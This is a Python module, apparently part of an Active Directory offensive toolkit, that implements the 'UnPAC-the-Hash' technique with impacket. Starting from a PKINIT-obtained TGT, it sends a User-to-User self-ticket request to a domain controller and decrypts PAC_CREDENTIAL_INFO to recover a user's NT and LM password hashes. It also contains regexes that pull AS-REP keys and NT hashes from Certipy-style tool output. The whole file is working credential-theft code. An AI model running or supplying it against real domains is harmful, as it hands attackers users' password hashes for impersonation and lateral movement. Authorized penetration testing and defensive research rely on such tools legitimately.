"""UnPAC-the-Hash helpers: U2U self-ticket + PAC_CREDENTIAL_INFO decryption.

After PKINIT the KDC embeds NTLM hashes in ``PAC_CREDENTIAL_INFO``, encrypted
to the AS-REP key (KERB_NON_KERB_SALT / key usage 16). Recovery requires:

1. A TGT obtained via PKINIT (ccache)
2. The AS-REP encryption key from that PKINIT exchange
3. A User-to-User TGS-REQ for ``self`` with ``enc-tkt-in-skey``
4. Decrypting the ticket with the TGS session key, then the credential blob
   with the AS-REP key
"""

from __future__ import annotations

import datetime
import logging
import os
import random
import re
from binascii import hexlify, unhexlify
from typing import Any

_logger = logging.getLogger(__name__)

# Certipy / gettgtpkinit style AS-REP key lines
_ASREP_KEY_RE = re.compile(
    r"(?:AS-?REP(?:\s+encryption)?\s+key|asrep[_ -]?key)\s*[:=]\s*([0-9a-fA-F]+)",
    re.IGNORECASE,
)
_NT_HASH_RE = re.compile(
    r"(?:Got NT hash|NT hash|Recovered NT Hash)\s*(?:for\s+\S+\s*)?[:=]?\s*"
    r"(?:[0-9a-fA-F]{32}:)?([0-9a-fA-F]{32})",
    re.IGNORECASE,
)


def parse_asrep_key(text: str | None) -> str | None:
    """Extract a hex AS-REP key from tool stdout/stderr."""
    if not text:
        return None
    match = _ASREP_KEY_RE.search(text)
    return match.group(1).lower() if match else None


def parse_nt_hash_from_text(text: str | None) -> str | None:
    """Extract a recovered NT hash from Certipy/gettgtpkinit-style output."""
    if not text:
        return None
    match = _NT_HASH_RE.search(text)
    return match.group(1).lower() if match else None


def decrypt_pac_credential_info(pac_data: bytes, asrep_key_hex: str) -> dict[str, str] | None:
    """Walk a PAC blob and decrypt ``PAC_CREDENTIAL_INFO`` with the AS-REP key."""
    from impacket.dcerpc.v5.rpcrt import TypeSerialization1
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.krb5.pac import (
        NTLM_SUPPLEMENTAL_CREDENTIAL,
        PAC_CREDENTIAL_DATA,
        PAC_CREDENTIAL_INFO,
        PAC_INFO_BUFFER,
        PACTYPE,
    )

    key_bytes = unhexlify(asrep_key_hex.strip())
    pac = PACTYPE(pac_data)
    buff = pac["Buffers"]
    for _ in range(int(pac["cBuffers"])):
        info = PAC_INFO_BUFFER(buff)
        data = pac["Buffers"][info["Offset"] - 8 :][: info["cbBufferSize"]]
        if info["ulType"] == 2:  # PAC_CREDENTIAL_INFO
            credinfo = PAC_CREDENTIAL_INFO(data)
            cipher = _enctype_table[int(credinfo["EncryptionType"])]
            key = Key(int(credinfo["EncryptionType"]), key_bytes)
            plain = cipher.decrypt(key, 16, credinfo["SerializedData"])
            type1 = TypeSerialization1(plain)
            # Skip NDR referent ID for the Credentials pointer.
            cred_data = PAC_CREDENTIAL_DATA(plain[len(type1) + 4 :])
            for cred in cred_data["Credentials"]:
                ntlm = NTLM_SUPPLEMENTAL_CREDENTIAL(b"".join(cred["Credentials"]))
                nt_hash = hexlify(bytes(ntlm["NtPassword"])).decode("ascii")
                lm_hash = hexlify(bytes(ntlm["LmPassword"])).decode("ascii")
                return {
                    "status": "recovered",
                    "nt_hash": nt_hash,
                    "lm_hash": lm_hash,
                }
        buff = buff[len(info) :]
    return None


def request_u2u_pac(
    *,
    ccache_path: str,
    username: str,
    domain: str,
    dc_ip: str,
    asrep_key_hex: str,
) -> dict[str, Any]:
    """Request a U2U self-ticket and decrypt PAC credential material."""
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AD_IF_RELEVANT,
        AP_REQ,
        AS_REP,
        TGS_REP,
        TGS_REQ,
        Authenticator,
        EncTicketPart,
        seq_set,
        seq_set_iter,
    )
    from impacket.krb5.asn1 import (
        Ticket as TicketAsn1,
    )
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import _enctype_table
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.types import KerberosTime, Principal, Ticket
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue

    previous = os.environ.get("KRB5CCNAME")
    os.environ["KRB5CCNAME"] = ccache_path
    try:
        ccache = CCache.loadFile(ccache_path)
        principal = f"krbtgt/{domain.upper()}@{domain.upper()}"
        creds = ccache.getCredential(principal)
        if creds is None and ccache.credentials:
            creds = ccache.credentials[0]
        if creds is None:
            return {"ok": False, "error": "No TGT credentials found in ccache"}
        tgt_blob = creds.toTGT()
        tgt, cipher, session_key = tgt_blob["KDC_REP"], tgt_blob["cipher"], tgt_blob["sessionKey"]
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        ticket = Ticket()
        ticket.from_asn1(decoded_tgt["ticket"])

        ap_req = AP_REQ()
        ap_req["pvno"] = 5
        ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req["ap-options"] = constants.encodeFlags([])
        seq_set(ap_req, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"] = str(decoded_tgt["crealm"])
        client_name = Principal()
        client_name.from_asn1(decoded_tgt, "crealm", "cname")
        seq_set(authenticator, "cname", client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.UTC)
        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)
        encrypted_authenticator = cipher.encrypt(
            session_key, 7, encoder.encode(authenticator), None
        )
        ap_req["authenticator"] = noValue
        ap_req["authenticator"]["etype"] = cipher.enctype
        ap_req["authenticator"]["cipher"] = encrypted_authenticator

        tgs_req = TGS_REQ()
        tgs_req["pvno"] = 5
        tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req["padata"] = noValue
        tgs_req["padata"][0] = noValue
        tgs_req["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
        )
        tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)

        req_body = seq_set(tgs_req, "req-body")
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.enc_tkt_in_skey.value,
        ]
        req_body["kdc-options"] = constants.encodeFlags(opts)
        server_name = Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        seq_set(req_body, "sname", server_name.components_to_asn1)
        req_body["realm"] = str(decoded_tgt["crealm"])
        req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body["nonce"] = random.getrandbits(31)
        seq_set_iter(
            req_body,
            "etype",
            (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
        )
        seq_set_iter(req_body, "additional-tickets", (ticket.to_asn1(TicketAsn1()),))

        response = sendReceive(encoder.encode(tgs_req), domain, dc_ip)
        tgs = decoder.decode(response, asn1Spec=TGS_REP())[0]
        enc_ticket = tgs["ticket"]["enc-part"]["cipher"]
        ticket_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]
        plain_ticket = ticket_cipher.decrypt(session_key, 2, enc_ticket)

        enc_part = decoder.decode(plain_ticket, asn1Spec=EncTicketPart())[0]
        ad_if_relevant = decoder.decode(
            enc_part["authorization-data"][0]["ad-data"], asn1Spec=AD_IF_RELEVANT()
        )[0]
        pac_bytes = ad_if_relevant[0]["ad-data"].asOctets()
        recovered = decrypt_pac_credential_info(pac_bytes, asrep_key_hex)
        if recovered is None:
            return {
                "ok": False,
                "error": "PAC_CREDENTIAL_INFO not present (TGT may not be PKINIT-origin)",
            }
        return {"ok": True, **recovered}
    except Exception as exc:
        _logger.debug("U2U UnPAC failed", exc_info=True)
        return {"ok": False, "error": str(exc)}
    finally:
        if previous is None:
            os.environ.pop("KRB5CCNAME", None)
        else:
            os.environ["KRB5CCNAME"] = previous
